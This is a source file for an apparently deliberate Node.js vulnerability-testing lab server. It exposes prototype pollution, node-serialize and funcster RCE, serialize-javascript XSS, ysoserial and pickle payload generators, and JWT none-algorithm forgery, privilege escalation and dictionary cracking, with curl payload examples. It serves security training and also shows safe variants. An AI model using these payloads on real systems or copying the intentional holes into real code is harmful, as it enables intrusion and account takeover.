const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs-extra');
const JavaDeserializationVulnerability = require('./java-deserialization');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Node.js deserialization vulnerability modules
let nodeSerialize, serializeJavaScript, funcster;
try {
    nodeSerialize = require('node-serialize');
} catch (e) {
    console.log('⚠️  node-serialize not installed');
}
try {
    serializeJavaScript = require('serialize-javascript');
} catch (e) {
    console.log('⚠️  serialize-javascript not installed');
}
try {
    funcster = require('funcster');
} catch (e) {
    console.log('⚠️  funcster not installed');
}

const app = express();
const port = process.env.PORT || 3001;

// Multer configuration for file uploads
const uploadDir = './uploads/';
const upload = multer({ 
    dest: uploadDir,
    limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Initialize Java deserialization module
const javaDeser = new JavaDeserializationVulnerability();

// Vulnerable endpoint for Prototype Pollution
app.post('/prototype_pollution', (req, res) => {
    // Simulate a vulnerable merge operation
    // In a real app, this would be a vulnerable library function
    // that doesn't properly sanitize keys like '__proto__'.
    
    function assignDeep(target, source) {
        for (const key in source) {
            if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                // This is the missing check in vulnerable implementations
                // For demonstration, we'll allow it to show the vulnerability
            }
            if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
                if (!target[key] || typeof target[key] !== 'object') {
                    target[key] = {};
                }
                assignDeep(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }

    let userControlledObject = {};
    assignDeep(userControlledObject, req.body); // This is where the pollution would happen

    // Now, check if Object.prototype was polluted
    // This is the actual test for pollution
    if (({}).pollutedProperty === 'polluted') {
        res.json({ message: 'Prototype polluted!', status: 'vulnerable', test_result: 'Object.prototype.pollutedProperty is now "polluted"' });
    } else {
        res.json({ message: 'Prototype not polluted yet. Send a payload like {"__proto__": {"pollutedProperty": "polluted"}}', status: 'safe' });
    }
});

// ==================== Node.js Deserialization Endpoints ====================

// node-serialize 취약점 테스트
app.post('/nodejs/node_serialize', (req, res) => {
    if (!nodeSerialize) {
        return res.json({ 
            success: false, 
            message: 'node-serialize 패키지가 설치되지 않음',
            status: 'error'
        });
    }

    try {
        const { payload } = req.body;
        
        if (!payload) {
            return res.json({
                success: false,
                message: '페이로드가 필요합니다. 예: {"username":"admin","password":"123","rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
                status: 'info'
            });
        }

        console.log('🚨 node-serialize 취약점 테스트 시작');
        console.log('페이로드:', payload);

        // 취약한 역직렬화 실행
        const result = nodeSerialize.unserialize(payload);
        
        res.json({
            success: true,
            message: 'node-serialize 역직렬화 완료',
            status: 'vulnerable',
            result: result,
            warning: '🚨 실제 환경에서는 임의 코드가 실행될 수 있습니다!'
        });

    } catch (error) {
        console.error('node-serialize 오류:', error.message);
        res.json({
            success: false,
            message: 'node-serialize 오류: ' + error.message,
            status: 'error'
        });
    }
});

// serialize-javascript XSS 취약점 테스트
app.post('/nodejs/serialize_javascript', (req, res) => {
    if (!serializeJavaScript) {
        return res.json({ 
            success: false, 
            message: 'serialize-javascript 패키지가 설치되지 않음',
            status: 'error'
        });
    }

    try {
        const { data, options = {} } = req.body;
        
        if (!data) {
            return res.json({
                success: false,
                message: '데이터가 필요합니다. 예: {"name": "</script><script>alert(\\"XSS\\")</script>"}',
                status: 'info'
            });
        }

        console.log('🚨 serialize-javascript XSS 테스트 시작');
        console.log('데이터:', data);

        // XSS에 취약한 직렬화 (unsafe 옵션 사용)
        const serialized = serializeJavaScript(data, { unsafe: true, ...options });
        
        // HTML 응답 생성 (XSS 실행 가능)
        const html = `
        <html>
            <head><title>Serialize JavaScript XSS Test</title></head>
            <body>
                <h1>🚨 serialize-javascript XSS 취약점 테스트</h1>
                <p>직렬화된 데이터:</p>
                <script>
                    var data = ${serialized};
                    document.write('<pre>' + JSON.stringify(data, null, 2) + '</pre>');
                </script>
            </body>
        </html>`;

        res.send(html); // HTML 응답으로 XSS 실행

    } catch (error) {
        console.error('serialize-javascript 오류:', error.message);
        res.json({
            success: false,
            message: 'serialize-javascript 오류: ' + error.message,
            status: 'error'
        });
    }
});

// funcster RCE 취약점 테스트
app.post('/nodejs/funcster', (req, res) => {
    if (!funcster) {
        return res.json({ 
            success: false, 
            message: 'funcster 패키지가 설치되지 않음',
            status: 'error'
        });
    }

    try {
        const { functionCode, args = [] } = req.body;
        
        if (!functionCode) {
            return res.json({
                success: false,
                message: '함수 코드가 필요합니다. 예: "function() { return require(\\"child_process\\").execSync(\\"whoami\\").toString(); }"',
                status: 'info'
            });
        }

        console.log('🚨 funcster RCE 테스트 시작');
        console.log('함수 코드:', functionCode);

        // 악의적인 함수 생성
        const maliciousFunction = eval(`(${functionCode})`);
        
        // funcster로 직렬화
        const serialized = funcster.serialize(maliciousFunction);
        console.log('직렬화된 함수:', serialized);
        
        // 취약한 역직렬화 및 실행
        const restored = funcster.deserialize(serialized);
        const result = restored.apply(null, args);

        res.json({
            success: true,
            message: 'funcster RCE 테스트 완료',
            status: 'vulnerable',
            serialized: serialized,
            result: result,
            warning: '🚨 임의 함수가 실행되었습니다!'
        });

    } catch (error) {
        console.error('funcster 오류:', error.message);
        res.json({
            success: false,
            message: 'funcster 오류: ' + error.message,
            status: 'error'
        });
    }
});

// 프로토타입 오염 고급 테스트
app.post('/nodejs/advanced_prototype_pollution', (req, res) => {
    try {
        const { payload } = req.body;
        
        if (!payload) {
            return res.json({
                success: false,
                message: '페이로드가 필요합니다. 예: {"__proto__": {"isAdmin": true}}',
                status: 'info'
            });
        }

        console.log('🚨 고급 프로토타입 오염 테스트 시작');
        console.log('페이로드:', payload);

        // 오염 전 상태 확인
        const beforePollution = {
            emptyObjectAdmin: ({}).isAdmin,
            processAdmin: process.env.isAdmin,
            globalAdmin: global.isAdmin
        };

        // 깊은 병합 함수 (취약한 구현)
        function deepMerge(target, source) {
            for (let key in source) {
                if (source.hasOwnProperty(key)) {
                    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
                        if (typeof target[key] !== 'object' || target[key] === null || Array.isArray(target[key])) {
                            target[key] = {};
                        }
                        deepMerge(target[key], source[key]);
                    } else {
                        target[key] = source[key];
                    }
                }
            }
            return target;
        }

        // 프로토타입 오염 실행
        let testObject = {};
        deepMerge(testObject, payload);

        // 오염 후 상태 확인
        const afterPollution = {
            emptyObjectAdmin: ({}).isAdmin,
            processAdmin: process.env.isAdmin,
            globalAdmin: global.isAdmin,
            testObject: testObject
        };

        res.json({
            success: true,
            message: '고급 프로토타입 오염 테스트 완료',
            status: 'vulnerable',
            before: beforePollution,
            after: afterPollution,
            polluted: JSON.stringify(beforePollution) !== JSON.stringify(afterPollution),
            warning: '🚨 프로토타입이 오염되었습니다!'
        });

    } catch (error) {
        console.error('프로토타입 오염 오류:', error.message);
        res.json({
            success: false,
            message: '프로토타입 오염 오류: ' + error.message,
            status: 'error'
        });
    }
});

// ==================== Java Deserialization Endpoints ====================

// Generate ysoserial payload
app.post('/java/generate_payload', async (req, res) => {
    try {
        const { gadget, command } = req.body;
        
        if (!gadget || !command) {
            return res.status(400).json({
                success: false,
                message: 'gadget과 command 파라미터가 필요합니다.'
            });
        }

        console.log(`🔥 Generating ysoserial payload: ${gadget} with command: ${command}`);
        
        const result = await javaDeser.generatePayload(gadget, command);
        res.json(result);
        
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Payload 생성 실패: ' + error.message,
            error: error.message
        });
    }
});

// Vulnerable Java deserialization endpoint (file upload)
app.post('/java/vulnerable_deserialize', upload.single('serialized_file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({
                success: false,
                message: '직렬화 파일이 필요합니다.'
            });
        }

        console.log(`🚨 Vulnerable deserialization of file: ${req.file.originalname}`);
        
        const fileData = await fs.readFile(req.file.path);
        const result = await javaDeser.vulnerableDeserialize(fileData);
        
        // 업로드된 파일 정리
        await fs.remove(req.file.path);
        
        res.json(result);
        
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Deserialization 실패: ' + error.message
        });
    }
});

// Safe Java deserialization endpoint (file upload)
app.post('/java/safe_deserialize', upload.single('serialized_file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({
                success: false,
                message: '직렬화 파일이 필요합니다.'
            });
        }

        const allowedClasses = req.body.allowed_classes ? 
            req.body.allowed_classes.split(',').map(s => s.trim()) : [];

        console.log(`✅ Safe deserialization of file: ${req.file.originalname}`);
        
        const fileData = await fs.readFile(req.file.path);
        const result = await javaDeser.safeDeserialize(fileData, allowedClasses);
        
        // 업로드된 파일 정리
        await fs.remove(req.file.path);
        
        res.json(result);
        
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Safe deserialization 실패: ' + error.message
        });
    }
});

// Get available ysoserial gadgets
app.get('/java/gadgets', async (req, res) => {
    try {
        const result = await javaDeser.getAvailableGadgets();
        res.json(result);
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Gadgets 조회 실패: ' + error.message
        });
    }
});

// Get test payloads list
app.get('/java/payloads', async (req, res) => {
    try {
        const payloads = await javaDeser.getTestPayloads();
        res.json({
            success: true,
            message: '테스트 페이로드 목록 조회 완료',
            count: payloads.length,
            payloads: payloads
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Payloads 조회 실패: ' + error.message
        });
    }
});

// Download generated payload
app.get('/java/download/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const payloadPath = `/app/java-payloads/${filename}`;
        
        if (await fs.pathExists(payloadPath)) {
            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.sendFile(payloadPath);
        } else {
            res.status(404).json({
                success: false,
                message: '페이로드 파일을 찾을 수 없습니다.'
            });
        }
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Download 실패: ' + error.message
        });
    }
});

// Cleanup payloads
app.delete('/java/payloads', async (req, res) => {
    try {
        const result = await javaDeser.cleanupPayloads();
        res.json(result);
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Cleanup 실패: ' + error.message
        });
    }
});

// Main page with API documentation
app.get('/', (req, res) => {
    const html = `
    <h1>🔥 Node.js Vulnerability Testing Suite</h1>
    <h2>Available Endpoints:</h2>
    
    <h3>🟢 Node.js Deserialization Vulnerabilities</h3>
    <ul>
        <li><code>POST /nodejs/node_serialize</code> - node-serialize RCE vulnerability</li>
        <li><code>POST /nodejs/serialize_javascript</code> - serialize-javascript XSS vulnerability</li>
        <li><code>POST /nodejs/funcster</code> - funcster function deserialization RCE</li>
        <li><code>POST /nodejs/advanced_prototype_pollution</code> - Advanced prototype pollution</li>
    </ul>
    
    <h3>📊 Prototype Pollution</h3>
    <ul>
        <li><code>POST /prototype_pollution</code> - Basic prototype pollution test</li>
    </ul>
    
    <h3>☕ Java Deserialization (ysoserial)</h3>
    <ul>
        <li><code>GET /java/gadgets</code> - Get available ysoserial gadgets</li>
        <li><code>POST /java/generate_payload</code> - Generate ysoserial payload
            <br>Body: <code>{"gadget": "CommonsBeanutils1", "command": "calc.exe"}</code></li>
        <li><code>POST /java/vulnerable_deserialize</code> - Vulnerable deserialization (file upload)</li>
        <li><code>POST /java/safe_deserialize</code> - Safe deserialization with whitelist</li>
        <li><code>GET /java/payloads</code> - List generated payloads</li>
        <li><code>GET /java/download/:filename</code> - Download payload file</li>
        <li><code>DELETE /java/payloads</code> - Cleanup payload files</li>
    </ul>
    
    <h3>🧪 Test Examples:</h3>
    
    <h4>🟢 1. node-serialize RCE:</h4>
    <pre>
curl -X POST http://localhost:3000/nodejs/node_serialize \\
  -H "Content-Type: application/json" \\
  -d '{"payload": "{\\"username\\":\\"admin\\",\\"rce\\":\\"_$$ND_FUNC$$_function(){require(\\\\\\"child_process\\\\\\").exec(\\\\\\"whoami\\\\\\", function(error, stdout, stderr) { console.log(stdout) });}()\\"}"}'
    </pre>
    
    <h4>🟢 2. serialize-javascript XSS:</h4>
    <pre>
curl -X POST http://localhost:3000/nodejs/serialize_javascript \\
  -H "Content-Type: application/json" \\
  -d '{"data": {"name": "</script><script>alert(\\"XSS\\")</script>"}}'
    </pre>
    
    <h4>🟢 3. funcster RCE:</h4>
    <pre>
curl -X POST http://localhost:3000/nodejs/funcster \\
  -H "Content-Type: application/json" \\
  -d '{"functionCode": "function() { return require(\\"child_process\\").execSync(\\"whoami\\").toString(); }"}'
    </pre>
    
    <h4>🟢 4. Prototype Pollution:</h4>
    <pre>
curl -X POST http://localhost:3000/nodejs/advanced_prototype_pollution \\
  -H "Content-Type: application/json" \\
  -d '{"payload": {"__proto__": {"isAdmin": true, "polluted": "yes"}}}'
    </pre>
    
    <h4>☕ 5. Java - Generate Payload:</h4>
    <pre>
curl -X POST http://localhost:3000/java/generate_payload \\
  -H "Content-Type: application/json" \\
  -d '{"gadget": "CommonsBeanutils1", "command": "whoami"}'
    </pre>
    
    <h4>☕ 6. Java - Test Vulnerable Deserialization:</h4>
    <pre>
# First generate a payload, then upload the .ser file
curl -X POST http://localhost:3000/java/vulnerable_deserialize \\
  -F "serialized_file=@payload.ser"
    </pre>
    `;
    
    res.send(html);
});

// Python Pickle Deserialization 엔드포인트 추가
const { spawn, exec } = require('child_process');
const path = require('path');

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', message: 'Node.js server is running' });
});

// Python Pickle 처리 엔드포인트
app.post('/pickle', (req, res) => {
    const { action, data, command, safe, allowed_modules } = req.body;
    
    switch (action) {
        case 'pickle_load':
            handlePickleLoad(req, res, data, safe, allowed_modules);
            break;
        case 'generate_pickle':
            generateMaliciousPickle(req, res, command);
            break;
        case 'analyze_pickle':
            analyzePickle(req, res, data);
            break;
        default:
            res.json({ success: false, error: 'Unknown action' });
    }
});

function handlePickleLoad(req, res, base64Data, safe = false, allowedModules = []) {
    try {
        const pickleData = Buffer.from(base64Data, 'base64');
        const tempFile = path.join(__dirname, 'temp_pickle.pkl');
        
        // 임시 파일에 pickle 데이터 저장
        fs.writeFileSync(tempFile, pickleData);
        
        // Python 스크립트 생성
        const pythonScript = safe ? createSafePickleScript(tempFile, allowedModules) : createVulnerablePickleScript(tempFile);
        const scriptFile = path.join(__dirname, 'pickle_loader.py');
        
        fs.writeFileSync(scriptFile, pythonScript);
        
        // Python 스크립트 실행
        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
            // 임시 파일 정리
            try {
                fs.unlinkSync(tempFile);
                fs.unlinkSync(scriptFile);
            } catch (e) {
                console.warn('임시 파일 정리 실패:', e.message);
            }
            
            if (error) {
                res.json({ 
                    success: false, 
                    error: `Python 실행 오류: ${error.message}`,
                    stderr: stderr
                });
                return;
            }
            
            try {
                const result = JSON.parse(stdout);
                res.json(result);
            } catch (parseError) {
                res.json({
                    success: true,
                    result: stdout,
                    stderr: stderr,
                    warning: stderr ? '표준 오류 출력이 감지되었습니다.' : undefined
                });
            }
        });
        
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

function generateMaliciousPickle(req, res, command = 'whoami') {
    try {
        const pythonScript = `
import pickle
import base64
import json
import subprocess
import sys

class MaliciousPickle:
    def __reduce__(self):
        return (subprocess.check_output, (["""${command}"""], {'shell': True, 'text': True}))

try:
    # 악성 객체 생성
    malicious_obj = MaliciousPickle()
    
    # pickle로 직렬화
    pickled_data = pickle.dumps(malicious_obj)
    
    # Base64 인코딩
    base64_data = base64.b64encode(pickled_data).decode('utf-8')
    
    result = {
        "success": True,
        "pickle_data": base64_data,
        "command": """${command}""",
        "size": len(pickled_data),
        "warning": "이 pickle 데이터는 역직렬화 시 명령어를 실행합니다!"
    }
    
    print(json.dumps(result))
    
except Exception as e:
    print(json.dumps({
        "success": False,
        "error": str(e)
    }))
`;
        
        const scriptFile = path.join(__dirname, 'pickle_generator.py');
        fs.writeFileSync(scriptFile, pythonScript);
        
        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
            try {
                fs.unlinkSync(scriptFile);
            } catch (e) {
                console.warn('임시 파일 정리 실패:', e.message);
            }
            
            if (error) {
                res.json({ 
                    success: false, 
                    error: `Python 실행 오류: ${error.message}`,
                    stderr: stderr
                });
                return;
            }
            
            try {
                const result = JSON.parse(stdout);
                res.json(result);
            } catch (parseError) {
                res.json({ success: false, error: 'Python 결과 파싱 실패', output: stdout });
            }
        });
        
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

function analyzePickle(req, res, base64Data) {
    try {
        const pickleData = Buffer.from(base64Data, 'base64');
        const tempFile = path.join(__dirname, 'temp_analyze.pkl');
        
        fs.writeFileSync(tempFile, pickleData);
        
        const pythonScript = `
import pickle
import pickletools
import json
import sys
import io

def analyze_pickle(pickle_file):
    try:
        # pickle 파일 읽기
        with open(pickle_file, 'rb') as f:
            pickle_data = f.read()
        
        # pickletools로 분석
        output = io.StringIO()
        pickletools.dis(pickle_data, output)
        opcodes = output.getvalue().split('\\n')
        
        # 위험한 연산 감지
        dangerous_ops = []
        modules_imported = []
        risk_level = 'low'
        
        for line in opcodes:
            if 'GLOBAL' in line and ('os' in line or 'subprocess' in line or 'sys' in line):
                dangerous_ops.append(line.strip())
                modules_imported.append(line.split()[-1] if line.split() else '')
                risk_level = 'high'
            elif 'REDUCE' in line:
                dangerous_ops.append('REDUCE operation detected')
                if risk_level == 'low':
                    risk_level = 'medium'
            elif 'BUILD' in line or 'INST' in line:
                if risk_level == 'low':
                    risk_level = 'medium'
        
        # pickle 버전 감지
        version = 'Unknown'
        if pickle_data[0:1] == b'\\x80':
            if len(pickle_data) > 1:
                version = f'Protocol {pickle_data[1]}'
        
        result = {
            "success": True,
            "analysis": {
                "version": version,
                "risk_level": risk_level,
                "dangerous_operations": dangerous_ops,
                "modules_imported": list(set(modules_imported)),
                "opcodes": [op for op in opcodes if op.strip()][:20]  # 처음 20개만
            }
        }
        
        print(json.dumps(result))
        
    except Exception as e:
        print(json.dumps({
            "success": False,
            "error": str(e)
        }))

analyze_pickle("${tempFile}")
`;
        
        const scriptFile = path.join(__dirname, 'pickle_analyzer.py');
        fs.writeFileSync(scriptFile, pythonScript);
        
        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
            try {
                fs.unlinkSync(tempFile);
                fs.unlinkSync(scriptFile);
            } catch (e) {
                console.warn('임시 파일 정리 실패:', e.message);
            }
            
            if (error) {
                res.json({ 
                    success: false, 
                    error: `Python 실행 오류: ${error.message}`,
                    stderr: stderr
                });
                return;
            }
            
            try {
                const result = JSON.parse(stdout);
                res.json(result);
            } catch (parseError) {
                res.json({ success: false, error: 'Python 결과 파싱 실패', output: stdout });
            }
        });
        
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

function createVulnerablePickleScript(pickleFile) {
    return `
import pickle
import json
import sys
import subprocess

def vulnerable_pickle_load(pickle_file):
    try:
        with open(pickle_file, 'rb') as f:
            # 🚨 취약한 역직렬화 - 모든 pickle 데이터를 무조건 로드
            result = pickle.load(f)
        
        return {
            "success": True,
            "result": str(result),
            "warning": "취약한 pickle.load()가 실행되었습니다!",
            "executed_command": "pickle.load()로 임의 코드가 실행될 수 있습니다"
        }
        
    except subprocess.CalledProcessError as e:
        return {
            "success": True,
            "result": "명령어 실행됨",
            "executed_command": str(e.cmd),
            "command_output": e.output if hasattr(e, 'output') else str(e),
            "warning": "🚨 RCE 성공: 시스템 명령어가 실행되었습니다!"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "warning": "역직렬화 중 오류가 발생했지만 이미 코드가 실행되었을 수 있습니다."
        }

result = vulnerable_pickle_load("${pickleFile}")
print(json.dumps(result))
`;
}

function createSafePickleScript(pickleFile, allowedModules) {
    const allowedList = allowedModules.join('", "');
    
    return `
import pickle
import json
import sys
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 허용된 모듈만 허용
        allowed_modules = ["${allowedList}"]
        if module in allowed_modules:
            return getattr(__import__(module), name)
        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")

def safe_pickle_load(pickle_file):
    try:
        with open(pickle_file, 'rb') as f:
            # 🔒 안전한 역직렬화 - 제한된 클래스만 허용
            unpickler = RestrictedUnpickler(f)
            result = unpickler.load()
        
        return {
            "success": True,
            "result": str(result),
            "message": "안전한 역직렬화가 성공했습니다",
            "allowed_modules": ["${allowedList}"]
        }
        
    except pickle.UnpicklingError as e:
        return {
            "success": False,
            "error": str(e),
            "message": "보안 정책에 의해 차단되었습니다",
            "security_status": "blocked_by_policy"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

result = safe_pickle_load("${pickleFile}")
print(json.dumps(result))
`;
}

// JWT 취약점 테스트 엔드포인트
app.post('/jwt', (req, res) => {
    const { action, user, token, manipulation, vulnerable } = req.body;
    
    switch (action) {
        case 'generate_jwt':
            generateJWT(req, res, user, vulnerable);
            break;
        case 'manipulate_jwt':
            manipulateJWT(req, res, token, manipulation);
            break;
        case 'verify_jwt':
            verifyJWT(req, res, token, vulnerable);
            break;
        case 'crack_jwt':
            crackJWT(req, res, token);
            break;
        default:
            res.json({ success: false, error: 'Unknown JWT action' });
    }
});

// JWT 생성 함수
function generateJWT(req, res, user, vulnerable = true) {
    try {
        const payload = {
            sub: user.id,
            username: user.username,
            role: user.role,
            email: user.email,
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + (vulnerable ? 3600 * 24 : 900) // 취약한 경우 24시간, 안전한 경우 15분
        };

        let secret, algorithm, header;
        const vulnerabilities = [];

        if (vulnerable) {
            // 🚨 취약한 JWT 설정
            secret = 'secret123'; // 약한 비밀 키
            algorithm = 'HS256';
            header = { alg: algorithm, typ: 'JWT' };
            
            vulnerabilities.push('약한 비밀 키 사용 (secret123)');
            vulnerabilities.push('긴 만료 시간 (24시간)');
            vulnerabilities.push('알고리즘 검증 부재');
            
        } else {
            // 🔒 안전한 JWT 설정
            secret = crypto.randomBytes(64).toString('hex'); // 강력한 비밀 키
            algorithm = 'HS256';
            header = { alg: algorithm, typ: 'JWT' };
            
            // 추가 클레임
            payload.iss = 'secure-app';
            payload.aud = 'secure-users';
        }

        const token = jwt.sign(payload, secret, { algorithm, header });
        
        res.json({
            success: true,
            token: token,
            header: header,
            payload: payload,
            secret: vulnerable ? secret : '[강력한 키로 보호됨]',
            vulnerabilities: vulnerable ? vulnerabilities : undefined
        });

    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

// JWT 조작 함수
function manipulateJWT(req, res, originalToken, manipulationType) {
    try {
        // JWT를 파싱 (서명 검증 없이)
        const decoded = jwt.decode(originalToken, { complete: true });
        
        if (!decoded) {
            return res.json({ success: false, error: 'Invalid JWT format' });
        }

        let manipulatedToken;
        let changes = {};
        let attackExplanation = '';

        switch (manipulationType) {
            case 'none_algorithm':
                // None 알고리즘 공격
                const noneHeader = { ...decoded.header, alg: 'none' };
                const nonePayload = decoded.payload;
                
                // 수동으로 JWT 생성 (서명 없이)
                const encodedHeader = Buffer.from(JSON.stringify(noneHeader)).toString('base64url');
                const encodedPayload = Buffer.from(JSON.stringify(nonePayload)).toString('base64url');
                manipulatedToken = `${encodedHeader}.${encodedPayload}.`;
                
                changes = { algorithm: 'HS256 → none', signature: 'removed' };
                attackExplanation = 'None 알고리즘을 사용하여 서명 검증을 우회합니다. 서버가 알고리즘을 검증하지 않으면 조작된 토큰이 유효하다고 판단할 수 있습니다.';
                break;

            case 'algorithm_confusion':
                // 알고리즘 혼동 공격 (RS256 → HS256)
                const confusionHeader = { ...decoded.header, alg: 'HS256' };
                const confusionPayload = decoded.payload;
                
                // 공개 키를 비밀 키로 사용 (시뮬레이션)
                const fakeSecret = 'fake_public_key_as_secret';
                manipulatedToken = jwt.sign(confusionPayload, fakeSecret, { header: confusionHeader });
                
                changes = { algorithm: 'RS256 → HS256', secret: 'public_key_as_secret' };
                attackExplanation = '비대칭 알고리즘(RS256)을 대칭 알고리즘(HS256)으로 변경하고, 공개 키를 비밀 키로 사용합니다.';
                break;

            case 'role_elevation':
                // 권한 상승 공격
                const elevatedPayload = { ...decoded.payload, role: 'admin' };
                const weakSecret = 'secret123'; // 약한 키 사용
                manipulatedToken = jwt.sign(elevatedPayload, weakSecret, { header: decoded.header });
                
                changes = { role: `${decoded.payload.role} → admin` };
                attackExplanation = '사용자 권한을 admin으로 상승시킵니다. 약한 비밀 키를 사용하여 새로운 서명을 생성합니다.';
                break;

            case 'expiry_extension':
                // 만료 시간 연장
                const extendedPayload = { 
                    ...decoded.payload, 
                    exp: Math.floor(Date.now() / 1000) + (365 * 24 * 3600) // 1년 연장
                };
                const extendSecret = 'secret123';
                manipulatedToken = jwt.sign(extendedPayload, extendSecret, { header: decoded.header });
                
                changes = { 
                    exp: `${new Date(decoded.payload.exp * 1000).toISOString()} → ${new Date(extendedPayload.exp * 1000).toISOString()}`
                };
                attackExplanation = '토큰 만료 시간을 1년으로 연장하여 장기간 사용 가능하게 만듭니다.';
                break;

            case 'signature_stripping':
                // 서명 제거 공격
                const parts = originalToken.split('.');
                manipulatedToken = `${parts[0]}.${parts[1]}.`;
                
                changes = { signature: 'stripped' };
                attackExplanation = 'JWT에서 서명 부분을 제거합니다. 서명 검증이 제대로 구현되지 않은 경우 토큰이 유효하다고 판단될 수 있습니다.';
                break;

            default:
                return res.json({ success: false, error: 'Unknown manipulation type' });
        }

        res.json({
            success: true,
            manipulated_token: manipulatedToken,
            original_token: originalToken,
            changes: changes,
            attack_explanation: attackExplanation,
            manipulation_type: manipulationType
        });

    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

// JWT 검증 함수
function verifyJWT(req, res, token, vulnerable = true) {
    try {
        let result = { success: true };

        if (vulnerable) {
            // 🚨 취약한 검증 (알고리즘 검증 없음)
            try {
                // 먼저 서명 없이 디코드
                const decoded = jwt.decode(token, { complete: true });
                
                if (!decoded) {
                    return res.json({ success: true, valid: false, reason: 'Invalid JWT format' });
                }

                // 취약한 검증: 알고리즘에 따라 다르게 처리
                if (decoded.header.alg === 'none') {
                    // None 알고리즘일 때 서명 검증 건너뛰기
                    result.valid = true;
                    result.decoded = decoded.payload;
                    result.security_issues = [
                        'None 알고리즘 허용으로 서명 검증 우회됨',
                        '알고리즘 검증 부재',
                        '조작된 토큰이 유효하다고 판단됨'
                    ];
                } else {
                    // 약한 키로 검증 시도
                    const weakSecrets = ['secret123', 'password', '123456', 'admin'];
                    let verified = false;
                    
                    for (const secret of weakSecrets) {
                        try {
                            const verifiedPayload = jwt.verify(token, secret);
                            result.valid = true;
                            result.decoded = verifiedPayload;
                            result.security_issues = [
                                `약한 비밀 키로 검증됨: ${secret}`,
                                '브루트포스 공격에 취약',
                                '알고리즘 검증 부재'
                            ];
                            verified = true;
                            break;
                        } catch (e) {
                            // 이 키로는 검증 실패, 다음 키 시도
                        }
                    }
                    
                    if (!verified) {
                        result.valid = false;
                        result.reason = '알려진 약한 키로 검증 실패';
                    }
                }

            } catch (error) {
                result.valid = false;
                result.reason = error.message;
            }

        } else {
            // 🔒 안전한 검증
            try {
                const strongSecret = crypto.randomBytes(64).toString('hex');
                
                // 안전한 검증 옵션
                const verifyOptions = {
                    algorithms: ['HS256'], // 허용된 알고리즘만
                    clockTolerance: 30,    // 30초 클록 편차
                    maxAge: '1h'           // 최대 1시간
                };
                
                const decoded = jwt.verify(token, strongSecret, verifyOptions);
                result.valid = true;
                result.decoded = decoded;
                
            } catch (error) {
                result.valid = false;
                result.reason = `안전한 검증 실패: ${error.message}`;
                
                // 추가 보안 검사
                const decodedUnsafe = jwt.decode(token, { complete: true });
                if (decodedUnsafe) {
                    const securityIssues = [];
                    
                    if (decodedUnsafe.header.alg === 'none') {
                        securityIssues.push('None 알고리즘 감지 - 차단됨');
                    }
                    if (!decodedUnsafe.payload.exp || decodedUnsafe.payload.exp > Math.floor(Date.now() / 1000) + 3600) {
                        securityIssues.push('만료 시간이 너무 길거나 설정되지 않음');
                    }
                    
                    result.security_analysis = securityIssues;
                }
            }
        }

        res.json(result);

    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

// JWT 크랙킹 함수
function crackJWT(req, res, token) {
    try {
        const decoded = jwt.decode(token, { complete: true });
        
        if (!decoded) {
            return res.json({ success: false, error: 'Invalid JWT format' });
        }

        if (decoded.header.alg === 'none') {
            return res.json({
                success: true,
                cracked_secret: null,
                crack_method: 'No secret needed (none algorithm)',
                time_taken: '0ms',
                attempts: ['None 알고리즘이므로 비밀 키 불필요']
            });
        }

        const startTime = Date.now();
        const commonSecrets = [
            'secret', 'secret123', 'password', '123456', 'admin', 'test',
            'key', 'jwt', 'token', 'auth', 'api', 'dev', 'prod',
            'your-256-bit-secret', 'mysecretkey', 'secretkey'
        ];
        
        const attempts = [];
        
        for (const secret of commonSecrets) {
            attempts.push(`시도: ${secret}`);
            try {
                jwt.verify(token, secret);
                const timeElapsed = Date.now() - startTime;
                
                return res.json({
                    success: true,
                    cracked_secret: secret,
                    crack_method: 'Dictionary attack',
                    time_taken: `${timeElapsed}ms`,
                    attempts: attempts
                });
                
            } catch (e) {
                // 이 키는 맞지 않음, 계속 시도
            }
        }

        const timeElapsed = Date.now() - startTime;
        res.json({
            success: true,
            cracked_secret: null,
            crack_method: 'Dictionary attack failed',
            time_taken: `${timeElapsed}ms`,
            attempts: attempts,
            message: '사전 공격으로 크랙할 수 없음. 더 강력한 브루트포스나 다른 방법이 필요합니다.'
        });

    } catch (error) {
        res.json({ success: false, error: error.message });
    }
}

app.listen(port, () => {
